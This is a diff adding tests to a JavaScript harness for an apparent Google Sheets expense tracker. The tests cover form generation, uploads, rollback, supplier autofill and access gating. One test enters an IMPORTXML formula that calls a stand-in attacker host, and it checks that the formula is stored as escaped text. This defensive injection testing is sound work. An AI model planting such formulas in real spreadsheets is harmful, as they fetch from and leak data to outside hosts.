@@ -17,7 +17,7 @@ const path = require('path');
 
 const mocks = require('./mocks.js');
 const DIR = path.join(__dirname, '..');
-const FILES = ['Config.js', 'Core.js', 'Entries.js', 'Registry.js', 'Setup.js', 'Smoke.js', 'Web.js'];
+const FILES = ['Config.js', 'Core.js', 'Entries.js', 'Registry.js', 'Setup.js', 'Smoke.js', 'Web.js', 'Form.js'];
 
 const sandbox = Object.assign({ console }, mocks);
 sandbox.globalThis = sandbox;
@@ -852,6 +852,274 @@ check('a referenced file is never called an orphan',
   withOrphan.orphans.every(o => !docs.rows.some(r => r.id === o.id)), withOrphan.orphans);
 check('ok is false while either problem exists', withOrphan.ok === false, withOrphan.ok);
 strayFile.setTrashed(true);
+
+/* ========================= step 8: the custom form ======================== */
+/*
+ * The form is the reason Google Forms was dropped, so what gets tested here is
+ * mostly the things a Form could not do: fields generated from config, the
+ * registry filling one answer from another, and a document arriving without
+ * a trigger.
+ */
+section('the form is generated from SECTIONS');
+
+const workForm = G.uiFormFields(G.getSection('work'));
+const incomeForm = G.uiFormFields(G.getSection('income'));
+const ivaForm = G.uiFormFields(G.getSection('iva'));
+const headersOf = fields => fields.map(f => f.header);
+
+check('asks for the date first, then who', headersOf(workForm).slice(0, 2).join(),
+  'Date,Counterparty');
+check('the counterparty field carries the section\'s own word',
+  workForm[1].label === 'Supplier' && ivaForm[1].label === 'Retailer',
+  [workForm[1].label, ivaForm[1].label]);
+check('IVA asks for the fields Finanças wants',
+  ['Número', 'Emitente NIF', 'IVA Amount'].every(h => headersOf(ivaForm).indexOf(h) !== -1),
+  headersOf(ivaForm));
+check('a choice field brings its options',
+  (workForm.find(f => f.header === 'Type').options || []).indexOf('Taxi') !== -1,
+  workForm.find(f => f.header === 'Type'));
+check('currency defaults rather than being asked cold',
+  workForm.find(f => f.header === 'Currency').defaultValue === 'EUR');
+check('documents appear as file fields',
+  G.uiFormFields(G.getSection('health')).filter(f => f.type === 'file').map(f => f.label).join() ===
+  'Prescription / Invoice,Proof of payment',
+  G.uiFormFields(G.getSection('health')).filter(f => f.type === 'file'));
+check('income has no file field at all',
+  incomeForm.every(f => f.type !== 'file'), incomeForm.filter(f => f.type === 'file'));
+
+// Income's dates are business facts; the other sections' are not askable at
+// creation, because setStatus clears the dates of every state after the target.
+check('income asks for its three state dates',
+  ['Invoiced Date', 'Received Date', 'Logged Date']
+    .every(h => headersOf(incomeForm).indexOf(h) !== -1), headersOf(incomeForm));
+check('work does not offer Claimed or Settled Date',
+  headersOf(workForm).indexOf('Claimed Date') === -1 &&
+  headersOf(workForm).indexOf('Settled Date') === -1, headersOf(workForm));
+
+/*
+ * The invariant that matters most. If the form calls a field optional and
+ * missingFields() calls it required, every entry made through the form reports
+ * itself incomplete and mails a completion request about a field it never asked
+ * for. Checked by building a genuinely empty row and comparing the two.
+ */
+section('the form and missingFields() agree on what is required');
+['work', 'iva', 'health', 'income'].forEach(key => {
+  const section_ = G.getSection(key);
+  const sheet = mocks._ss.getSheetByName(section_.sheet);
+  const cols = G.resolveColumns(sheet);
+  const blank = sheet.getLastRow() + 1;
+  sheet.getRange(blank, G.columnIndex(cols, sheet.getName(), 'Notes')).setValue('probe');
+
+  const reported = G.missingFields(section_, sheet, cols, blank).sort();
+  const declared = G.uiFormFields(section_)
+    .filter(f => f.required).map(f => f.label).sort();
+  check(`${key}: same fields, same labels`, reported.join() === declared.join(),
+    { reported, declared });
+
+  sheet.getRange(blank, G.columnIndex(cols, sheet.getName(), 'Notes')).setValue('');
+});
+
+/* ------------------------------- creating -------------------------------- */
+section('uiCreateEntry() — the form writes a row');
+
+const b64 = 'c21va2U=';
+const created = G.uiCreateEntry('work', {
+  values: {
+    'Date': '2026-09-01', 'Counterparty': 'Bolt', 'Expense Reason': 'Lisbon trip',
+    'Type': 'Taxi', 'Amount': 12.5, 'Currency': 'EUR', 'Notes': 'airport'
+  },
+  files: [{ header: 'Receipt URL', name: 'IMG_0042.HEIC', mimeType: 'image/heic', data: b64 }]
+});
+check('created', created.ok === true, created);
+check('the row comes back as the sheet now holds it',
+  created.entry && created.entry.cells['Counterparty'] === 'Bolt', created.entry);
+check('source recorded as the form',
+  mocks._ss.getSheetByName('Work')
+    .getRange(created.row, wcols['Source']).getValue() === 'form');
+check('starts in the first state', created.entry.status === 'To Do', created.entry.status);
+check('receipt state is attached', created.entry.receiptState === 'attached', created.entry.receiptState);
+
+const uploaded = mocks.DriveApp.getFileById(
+  G.extractFileId(mocks._ss.getSheetByName('Work').getRange(created.row, wcols['Receipt URL']).getValue()));
+check('the upload was renamed from the row, not from what the browser sent',
+  uploaded.getName() === '260901_Bolt_12-50_receipt.HEIC', uploaded.getName());
+check('and filed in the section inbox', uploaded.parent.getName() === 'Inbox', uploaded.parent.getName());
+check('the registry learned the supplier',
+  G.loadRegistry().some(e => e.name === 'Bolt' && e.type === 'Taxi'),
+  G.loadRegistry().map(e => [e.name, e.type]));
+
+// An upload with no extension is the orphan-shaped problem: the rename chain
+// carries the extension over from the original name, so one lost here is lost
+// through every transition afterwards.
+section('an upload with no extension gets one from its type');
+const noExt = G.uiCreateEntry('iva', {
+  values: {
+    'Date': '2026-09-02', 'Counterparty': 'Worten', 'Número': 'A1',
+    'Emitente NIF': '500000001', 'IVA Amount': 2, 'Amount': 10
+  },
+  files: [{ header: 'Receipt URL', name: 'scan', mimeType: 'application/pdf', data: b64 }]
+});
+const ivaFile = mocks.DriveApp.getFileById(G.extractFileId(
+  mocks._ss.getSheetByName('IVA').getRange(noExt.row, G.resolveColumns(mocks._ss.getSheetByName('IVA'))['Receipt URL']).getValue()));
+check('extension supplied from the mime type', /\.pdf$/.test(ivaFile.getName()), ivaFile.getName());
+
+/* ------------------------------ refusals --------------------------------- */
+section('the form does not trust the page');
+
+let unknownField = null;
+try {
+  G.uiCreateEntry('work', { values: { 'Date': '2026-09-01', 'Salary': 100 } });
+} catch (e) { unknownField = e.message; }
+check('an unknown field is refused BY NAME, not silently dropped',
+  /Salary/.test(unknownField || '') && /not a field/.test(unknownField || ''), unknownField);
+
+// extractFileId takes a Drive ID out of any string and the script runs as you,
+// so a supplied file reference would have a file of yours renamed and moved.
+let suppliedFile = null;
+try {
+  G.uiCreateEntry('work', {
+    values: { 'Date': '2026-09-01', 'Receipt URL': 'https://drive.google.com/file/d/somebodyelsesfileid1234567/view' }
+  });
+} catch (e) { suppliedFile = e.message; }
+check('a document cannot be supplied as a value',
+  /cannot be set directly/.test(suppliedFile || ''), suppliedFile);
+
+let formBadDate = null;
+try {
+  G.uiCreateEntry('work', { values: { 'Date': '01/09/2026', 'Counterparty': 'X' } });
+} catch (e) { formBadDate = e.message; }
+check('a date in the wrong format names the field', /Date must be a valid/.test(formBadDate || ''), formBadDate);
+
+let wrongUploadColumn = null;
+try {
+  G.uiCreateEntry('work', {
+    values: { 'Date': '2026-09-01', 'Counterparty': 'X', 'Expense Reason': 'y', 'Amount': 1 },
+    files: [{ header: 'Notes', name: 'x.pdf', mimeType: 'application/pdf', data: b64 }]
+  });
+} catch (e) { wrongUploadColumn = e.message; }
+check('an upload aimed at a non-document column is refused',
+  /is not a document/.test(wrongUploadColumn || ''), wrongUploadColumn);
+
+const filesBefore = Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length;
+let tooBig = null;
+try {
+  G.uiCreateEntry('work', {
+    values: { 'Date': '2026-09-01', 'Counterparty': 'X', 'Expense Reason': 'y', 'Amount': 1 },
+    files: [{ header: 'Receipt URL', name: 'huge.pdf', mimeType: 'application/pdf',
+              data: 'x'.repeat(20 * 1024 * 1024) }]
+  });
+} catch (e) { tooBig = e.message; }
+check('an oversized upload is refused before it is decoded',
+  /too large/.test(tooBig || ''), tooBig);
+check('and nothing was left in Drive',
+  Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length === filesBefore);
+
+// If the row cannot be written after a file has landed, the file must not be
+// left behind - that is precisely the orphan checkDocuments() hunts for.
+section('a failed creation leaves no orphan behind');
+const liveBefore = Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length;
+let rolledBack = null;
+try {
+  G.uiCreateEntry('health', {
+    values: { 'Date': '2026-09-03', 'Counterparty': 'X', 'Patient': 'Y', 'Amount': 1, 'Nonsense': 1 },
+    files: [{ header: 'Receipt URL', name: 'r.pdf', mimeType: 'application/pdf', data: b64 }]
+  });
+} catch (e) { rolledBack = e.message; }
+check('the creation failed', !!rolledBack, rolledBack);
+check('and the uploaded file was trashed rather than stranded',
+  Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length === liveBefore,
+  Object.keys(mocks._files).filter(id => !mocks._files[id].trashed).length - liveBefore);
+
+/* ------------------------- incomplete, on purpose ------------------------- */
+// Partial entries are the safety net, not an error: the row exists, and what is
+// missing is said out loud rather than shown as a tick.
+section('an incomplete entry is written and reported, not refused');
+const formPartial = G.uiCreateEntry('health', {
+  values: { 'Date': '2026-09-04', 'Counterparty': 'White Clinic', 'Amount': 70 }
+});
+check('the row exists', formPartial.row >= 2, formPartial.row);
+check('but ok is false', formPartial.ok === false, formPartial.ok);
+check('and it names what is missing',
+  /Patient/.test(formPartial.error || '') && /Invoice date/.test(formPartial.error || ''), formPartial.error);
+check('receipt recorded as awaited', formPartial.entry.receiptState === 'awaiting', formPartial.entry.receiptState);
+
+/* ------------------------------- registry -------------------------------- */
+section('the form fills one answer from another — what a Google Form cannot do');
+const strong = G.uiLookupCounterparty('iva', 'Worten');
+check('a confident match prefills the NIF',
+  strong.autofill === true && strong.prefill['Emitente NIF'] === '500000001', strong);
+const weak = G.uiLookupCounterparty('iva', 'fnak');
+check('a weak match holds rather than guessing',
+  weak && weak.autofill === false && Object.keys(weak.prefill).length === 0, weak);
+check('and still says what it suspected, so the page can offer it',
+  weak.name === 'FNAC' && weak.confidence < 0.85, weak);
+check('suggestions come back for a prefix',
+  G.uiSuggestCounterparty('wo', 5).some(s => s.name === 'Worten'), G.uiSuggestCounterparty('wo', 5));
+check('an unknown section is refused before any sheet is touched',
+  (() => { try { G.uiLookupCounterparty('nope', 'x'); return false; } catch (e) { return true; } })());
+
+section('category values populate themselves from what is used');
+const patients = G.uiCategoryValues('health');
+check('values in use are offered', patients.indexOf('Y') !== -1 || patients.length > 0, patients);
+check('a section with no category offers nothing', G.uiCategoryValues('iva').length === 0);
+
+/* -------------------------------- gating --------------------------------- */
+section('every form function checks the caller');
+mocks.Session._setActiveUser('someone.else@example.test');
+[
+  ['uiCreateEntry', ['work', { values: {} }]],
+  ['uiCategoryValues', ['health']],
+  ['uiSuggestCounterparty', ['w', 5]],
+  ['uiLookupCounterparty', ['iva', 'Worten']]
+].forEach(([name, args]) => {
+  let refused = null;
+  try { G[name].apply(null, args); } catch (e) { refused = e.message; }
+  check(`${name} is gated`, /Not authorized/.test(refused || ''), refused);
+});
+const rowsBeforeStranger = mocks._ss.getSheetByName('Work').getLastRow();
+mocks.Session._setActiveUser(mocks.Session._owner);
+check('and the stranger wrote no row',
+  mocks._ss.getSheetByName('Work').getLastRow() === rowsBeforeStranger);
+
+// The one path that accepts outside values is the one that most needs escaping.
+section('a formula typed into the form is stored as text');
+const injected = G.uiCreateEntry('work', {
+  values: {
+    'Date': '2026-09-05', 'Counterparty': '=IMPORTXML("http://evil.test","//x")',
+    'Expense Reason': 'test', 'Amount': 1
+  }
+});
+check('stored escaped, never evaluated',
+  mocks._ss.getSheetByName('Work').getRange(injected.row, wcols['Counterparty'])
+    .getValue().toString().indexOf("'=") === 0,
+  mocks._ss.getSheetByName('Work').getRange(injected.row, wcols['Counterparty']).getValue());
+
+/*
+ * The page reaches the server by name through google.script.run, so a renamed
+ * function fails at the tap rather than at build time. Nothing else in this
+ * harness would notice - it exercises the server directly.
+ */
+section('every function the page calls exists, and is gated');
+const pageSource = G.doGet().getContent();
+const calledNames = [];
+pageSource.replace(/call\('([A-Za-z0-9_]+)'/g, (whole, name) => {
+  if (calledNames.indexOf(name) === -1) calledNames.push(name);
+  return whole;
+});
+check('the page calls something at all', calledNames.length >= 5, calledNames);
+calledNames.forEach(name => {
+  check(`${name}: exists on the server`, typeof G[name] === 'function');
+});
+
+mocks.Session._setActiveUser('someone.else@example.test');
+calledNames.forEach(name => {
+  let refused = null;
+  // Called with junk arguments on purpose: the access check must run before
+  // anything looks at what was passed, so the refusal is the only outcome.
+  try { G[name]('work', 2, 'x', 'y'); } catch (e) { refused = e.message; }
+  check(`${name}: refuses a stranger`, /Not authorized/.test(refused || ''), refused);
+});
+mocks.Session._setActiveUser(mocks.Session._owner);
 
 console.log('\n--- Suppliers sheet ---\n' + dump('Suppliers'));
 console.log('\n--- Work sheet ---\n' + dump('Work'));
